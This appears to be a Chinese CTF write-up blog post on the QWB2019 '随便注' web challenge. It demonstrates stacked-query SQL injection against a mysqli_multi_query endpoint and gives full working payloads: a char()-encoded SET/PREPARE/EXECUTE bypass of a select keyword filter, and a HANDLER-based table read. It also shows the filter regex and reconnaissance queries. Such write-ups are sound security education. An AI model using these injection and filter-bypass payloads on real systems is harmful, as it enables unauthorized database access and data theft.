<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> QWB2019 Web -随便注（题解） · Patrilic's blog</title><meta name="description" content="QWB2019 Web -随便注（题解） - Patrilic"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/Avatar.jpg"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://patrilic.top/atom.xml" title="Patrilic's blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/Online_Tools" target="_self" class="nav-list-link">ONLINE_TOOLS</a></li><li class="nav-list-item"><a href="/Friends" target="_self" class="nav-list-link">FRIENDS</a></li><li class="nav-list-item"><a href="/2019/04/01/Hello/" target="_self" class="nav-list-link">ABOUT</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">QWB2019 Web -随便注（题解）</h1><div class="post-info">Jun 5, 2019</div><div class="post-content"><p>第一次遇到使用 <strong>mysqli_multi_query()</strong> 的题目，做个记录</p>
<p>概率论使我憔悴</p>
<h2 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><p>打开题目，就一个&lt;input>标签，随便输一个数字，burp抓一下<br><img src="/QWB2019 Web -随便注（题解）.resources/225795EF-A32C-497C-967D-C6AED199E73A.png" alt="a9bba15b8d47ba4edea294709f323bc5"></p>
<p>感觉是一般的select语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>, <span class="keyword">data</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> <span class="keyword">id</span> = &#123;$inject&#125;</span><br></pre></td></tr></table></figure></p>
<p>测一下过滤情况<br>随便输入一个<img src="/QWB2019 Web -随便注（题解）.resources/893B07F7-8A30-4FBD-923D-3203BF85F508.png" alt="0535bce1ced6095c073ded1c06110095"><br>爆出过滤情况<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>, $inject);</span><br></pre></td></tr></table></figure></p>
<p>尝试一波extractvalue(),无果..</p>
<p>然后就在测试一些常用的情况，类似于<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((substr(user(),1,1)&gt;'a'),sleep(5),1);</span><br></pre></td></tr></table></figure></p>
<p>后来@hpdoger告诉我说可以堆叠查询..<br>于是乎..<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure></p>
<p><img src="/QWB2019 Web -随便注（题解）.resources/C6C08A11-B19B-49EC-AECC-E88D6846C07A.png" alt="e77b6cef87b97ccf9d695c4f36dd2fe2"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span></span><br></pre></td></tr></table></figure>
<p><img src="/QWB2019 Web -随便注（题解）.resources/F4ECA2ED-A838-4A75-BA6B-5ED93136DB3E.png" alt="acde9a6b7ba360dbb9e0404f47a48a1c"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">describe</span><span class="string">`1919810931114514`</span></span><br></pre></td></tr></table></figure>
<p><img src="/QWB2019 Web -随便注（题解）.resources/B102EE66-34F1-4FB9-8098-65E35EB32CA3.png" alt="6bcd5a04abba3759bc0d190a82b550ce"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'version'</span></span><br></pre></td></tr></table></figure>
<p><img src="/QWB2019 Web -随便注（题解）.resources/5F55DDD1-4E28-46C6-8EE2-B3F9C8C8F00A.png" alt="9a2a58383e535d53cc886c3078bfbe33"></p>
<p>所以现在的信息就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">database: supersqli</span><br><span class="line">table: 1919810931114514</span><br><span class="line">column: flag</span><br><span class="line">version: 10.0.27-MariaDB-0ubuntu0.16.04.1</span><br></pre></td></tr></table></figure></p>
<p>然后还有个好玩的：<br>查看grant的时候: ;SHOW GRANTS FOR CURRENT_USER()<br><img src="/QWB2019 Web -随便注（题解）.resources/BD7CB99F-9E59-45B0-9AF7-1AE8E74158DC.png" alt="f7c19dd203bc1755b0d46759e09f93c7"></p>
<p>现在目标明确，就是要<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> flag <span class="keyword">from</span> <span class="number">191981093111414</span></span><br></pre></td></tr></table></figure></p>
<h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>利用set将<strong>select flag from 1919810931114514</strong>写入变量@patrilic中，利用prepare将变量设置为预处理，然后再execute</p>
<p>主要可以bypass掉select，用char()函数带入。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> @patrilic=<span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">32</span>),<span class="number">1919810931114514</span>);</span><br></pre></td></tr></table></figure></p>
<p><img src="/QWB2019 Web -随便注（题解）.resources/868A3AB6-CFD4-4B93-8ACF-7FD92F44A6C6.png" alt="f30557894cf438c4e47146a0cb3bbc45"></p>
<p>然后直接执行即可.<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=&apos;;SET+@patrilic=concat(char(115,101,108,101,99,116,32),char(102,108,97,103,32),char(102,114,111,109,32),char(96),1919810931114514,char(96));prepare+patrilic+from+@patrilic;execute+patrilic%23</span><br></pre></td></tr></table></figure></p>
<p>参考:<br><a href="https://blog.csdn.net/qq_42030417/article/details/80372800" target="_blank" rel="noopener">https://blog.csdn.net/qq_42030417/article/details/80372800</a></p>
<h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>利用mysql::handler<br><img src="/QWB2019 Web -随便注（题解）.resources/44DCE71B-290D-4DF1-BF78-8CA825633D9F.png" alt="078ec36715ece7186ada02a51ac1f367"></p>
<p>也可使用别名<br><img src="/QWB2019 Web -随便注（题解）.resources/6F664750-5A87-498E-9790-42EC62EAE0F3.png" alt="5e65dda79fc38e997716d9f5139dc88a"></p>
<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=&apos;;handler+`1919810931114514`+open;handler`1919810931114514`read+first%23</span><br></pre></td></tr></table></figure></p>
<p>参考：<br><a href="https://dev.mysql.com/doc/refman/5.7/en/handler.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/handler.html</a><br><a href="https://blog.csdn.net/JesseYoung/article/details/40785137" target="_blank" rel="noopener">https://blog.csdn.net/JesseYoung/article/details/40785137</a></p>
<h2 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h2><p>… </p>
</div></article></div></main><footer><div class="paginator"><a href="/2019/06/10/CISCN2019-西南赛区部分Web题解/" class="prev">PREV</a><a href="/2019/05/08/Command Execute By mshta/" class="next">NEXT</a></div><div class="copyright"><p>© 2019 <a href="http://patrilic.top">Patrilic</a>, powered by Apoll.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"tagMode":false});</script></body></html>